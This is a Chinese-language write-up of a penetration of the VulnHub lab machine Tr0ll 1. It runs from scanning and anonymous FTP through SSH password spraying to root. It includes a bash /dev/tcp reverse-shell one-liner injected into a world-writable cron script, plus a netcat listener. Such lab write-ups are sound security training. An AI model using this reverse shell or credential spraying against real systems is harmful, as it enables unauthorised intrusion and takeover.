+++
date = '2026-11-05T18:42:58+08:00'
draft = false
title = '[VulnHub靶机]Tr0ll 1渗透记录'
tags = ['渗透','Vulnhub','流量分析','信息收集']
+++

## 信息收集

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.7

### 端口扫描

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ sudo arp-scan -l                                                                                         
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.7      00:0c:29:39:e9:62       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.027 seconds (126.30 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ sudo nmap -sT --min-rate 10000 -p- 10.10.10.7
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-05 18:56 +0800
Nmap scan report for 10.10.10.7
Host is up (0.0029s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:39:E9:62 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.98 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ sudo nmap -sT -sV -sC -p21,22,80 10.10.10.7
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-05 18:57 +0800
Nmap scan report for 10.10.10.7
Host is up (0.00031s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.10.3
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 600
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)
|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)
|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)
|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/secret
MAC Address: 00:0C:29:39:E9:62 (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.36 seconds
```

注意到FTP允许匿名登陆  
漏洞扫描, 发现80端口的Web服务存在robots.txt和/secret/目录

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ sudo nmap --script=vuln -p21,22,80 10.10.10.7
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-05 18:59 +0800
Nmap scan report for 10.10.10.7
Host is up (0.00041s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum:
|   /robots.txt: Robots file
|_  /secret/: Potentially interesting folder
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
MAC Address: 00:0C:29:39:E9:62 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 321.34 seconds
```

### FTP信息收集

匿名登录FTP服务器

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ ftp 10.10.10.7
Connected to 10.10.10.7.
220 (vsFTPd 3.0.2)
Name (10.10.10.7:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

发现一个pcap文件

```shell
ftp> ls
229 Entering Extended Passive Mode (|||9143|).
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 09  2014 lol.pcap
226 Directory send OK.
```

切换到二进制模式并下载

```shell
ftp> bin
200 Switching to Binary mode.
ftp> get lol.pcap
```

### 流量分析

在wireshark中打开, 注意到是一些FTP数据包

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/wireshark%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%8C%85.avif)

过滤FTP流量, 发现有人从服务器上下载了一个叫`secret_stuff.txt`的文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/%E5%8F%91%E7%8E%B0secret_stuff%E6%96%87%E4%BB%B6.avif)

使用wireshark的"导出对象"功能提取文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/%E5%AF%BC%E5%87%BA%E5%AF%B9%E8%B1%A1.avif)

```text
Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P

Sucks, you were so close... gotta TRY HARDER!
```

`sup3rs3cr3tdirlol`看起来很像是密码, 我们记住它备用

### Web服务信息收集

浏览器访问80端口的Web服务, 发现只有一张图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

路径爆破, 只有之前Nmap扫出来的结果

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ dirsearch -u http://10.10.10.7/ -i 200,301,302,500

  _|. _ _  _  _  _ _|_    v0.4.4
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12295

Target: http://10.10.10.7/

[19:16:28] Scanning: 
[19:16:36] 200 -    36B - /index.html                                       
[19:16:39] 200 -    31B - /robots.txt                                       
[19:16:39] 301 -   308B - /secret  ->  http://10.10.10.7/secret/            
[19:16:39] 200 -    37B - /secret/                                          
                                                                             
Task Completed
```

访问robots.txt, 里面只写了`/secret`

```text
User-agent:*
Disallow: /secret
```

访问`/secret`, 发现是另一张图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/%E8%AE%BF%E9%97%AEsecret.avif)

我将这两幅图保存到本地, 用exiftool, binwalk和xxd分析了半天都没发现任何有价值的东西, 回顾现有的线索, 突然想到`sup3rs3cr3tdirlol`有没有可能是网站目录? 因为它里面有`dir`这个缩写  
尝试访问, 果然成功了, 里面有一个叫`roflmao`的文件

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/%E8%AE%BF%E9%97%AE%E9%9A%90%E8%97%8F%E7%9B%AE%E5%BD%95.avif)

### roflmao文件分析

探测文件类型, 发现是可执行文件

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ file roflmao  
roflmao: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=5e14420eaa59e599c2f508490483d959f3d2cf4f, not stripped
```

执行发现只打印了一句话

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ ./roflmao 
Find address 0x0856BF to proceed
```

binwalk没有发现捆绑

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ binwalk3 roflmao

                                                                       /home/kali/Tr0ll1/roflmao
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
DECIMAL                            HEXADECIMAL                        DESCRIPTION
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
0                                  0x0                                ELF binary, 32-bit executable, x86 for System-V (Unix), little endian
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

Analyzed 1 file for 85 file signatures (187 magic patterns) in 2.0 milliseconds
```

尝试浏览器访问`/0x0856BF`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/%E8%AE%BF%E9%97%AE%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E5%9C%B0%E5%9D%80.avif)

good_luck中存在一个文件which_one_lol.txt

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/goodluck.avif)

里面存在一堆用户名, 其中genphlux加上了提示" < -- Definitely not this one"

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/which_one_lol.avif)

this_folder_contains_the_password中有一个文件Pass.txt, 内容是`Good_job_:)`

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/this_folder_contains_the_password.avif)

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Tr0ll1/Pass.avif)

## SSH爆破

使用Pass.txt中的密码登录每一个账户

```shell
crackmapexec ssh 10.10.10.7 -u which_one_lol.txt -p Pass.txt
```

发现从blawrg开始无法连接22端口, 说明靶机做了爆破限制

```shell
SSH         10.10.10.7      22     10.10.10.7       [*] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
SSH         10.10.10.7      22     10.10.10.7       [-] maleus:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] ps-aux:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] felux:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] Eagle11:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] genphlux:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] usmc8892:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] blawrg:Good_job_:) [Errno None] Unable to connect to port 22 on 10.10.10.7
SSH         10.10.10.7      22     10.10.10.7       [-] wytshadow:Good_job_:) [Errno None] Unable to connect to port 22 on 10.10.10.7
SSH         10.10.10.7      22     10.10.10.7       [-] vis1t0r:Good_job_:) [Errno None] Unable to connect to port 22 on 10.10.10.7
SSH         10.10.10.7      22     10.10.10.7       [-] overflow:Good_job_:) [Errno None] Unable to connect to port 22 on 10.10.10.7
```

删掉已经失败的用户名, 重新尝试, 依旧没有成功

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ crackmapexec ssh 10.10.10.7 -u which_one_lol.txt -p Pass.txt
SSH         10.10.10.7      22     10.10.10.7       [*] SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
SSH         10.10.10.7      22     10.10.10.7       [-] blawrg:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] wytshadow:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] vis1t0r:Good_job_:) Authentication failed.
SSH         10.10.10.7      22     10.10.10.7       [-] overflow:Good_job_:) Authentication failed.
```

考虑Pass.txt文件名作为密码, 恢复用户名列表, 重新爆破, 发现一组凭据

```shell
SSH         10.10.10.7      22     10.10.10.7       [+] overflow:Pass.txt
```

登录靶机

```shell
ssh overflow@10.10.10.7
```

## 权限提升

操作一会发现ssh自动断开并出现提示

```text
Broadcast Message from root@trol                                               
        (somewhere) at 4:30 ...                                                
                                                                               
TIMES UP LOL!
```

那么靶机上很有可能存在自动任务, 查看自动任务却发现没有权限

```shell
$ cat /etc/crontab
cat: /etc/crontab: Permission denied
```

搜索自动任务相关日志

```shell
overflow@troll:/$ find / -name "cron*" -type f 2>/dev/null
/usr/sbin/cron
/usr/share/vim/vim74/syntax/crontab.vim
/usr/share/man/man1/crontab.1.gz
/usr/share/man/man8/cron.8.gz
/usr/share/man/man5/crontab.5.gz
/usr/share/doc/cron/examples/cron-stats.pl
/usr/share/doc/cron/examples/crontab2english.pl
/usr/share/doc/cron/examples/cron-tasks-review.sh
/usr/share/bash-completion/completions/crontab
/usr/bin/crontab
/run/crond.reboot
/run/crond.pid
/etc/init/cron.conf
/etc/default/cron
/etc/crontab
/etc/pam.d/cron
/var/log/cronlog
/var/lib/dpkg/info/cron.conffiles
/var/lib/dpkg/info/cron.preinst
/var/lib/dpkg/info/cron.prerm
/var/lib/dpkg/info/cron.postinst
/var/lib/dpkg/info/cron.postrm
/var/lib/dpkg/info/cron.list
/var/lib/dpkg/info/cron.md5sums
```

查看`/var/log/cronlog`内容, 发现运行了一个python脚本, 每2分钟运行一次

```text
*/2 * * * * cleaner.py
```

定位脚本位置

```shell
$ find / -name cleaner.py -type f 2>/dev/null
/lib/log/cleaner.py
```

查看脚本权限

```shell
overflow@troll:/$ ls -lhd /lib/log/cleaner.py
-rwxrwxrwx 1 root root 96 Aug 13  2014 /lib/log/cleaner.py
```

我们拥有全部权限, 查看内容

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

将其改写为反弹shell脚本

```shell
echo -e '#!/usr/bin/env python\nimport os;os.system("/bin/bash -c \"/bin/bash -i >&/dev/tcp/10.10.10.3/4444 0>&1\"")' > cleaner.py
```

攻击机开启监听, 等待打印2分钟后即可拿到rootshell

```shell
┌──(kali㉿kali)-[~/Tr0ll1]
└─$ rlwrap nc -lvp 4444
listening on [any] 4444 ...
10.10.10.7: inverse host lookup failed: Unknown host
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.7] 58283
bash: cannot set terminal process group (2450): Inappropriate ioctl for device
root@troll:~# whoami
root
root@troll:~# cd /root
root@troll:~# ls
proof.txt
root@troll:~# cat proof.txt
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
```
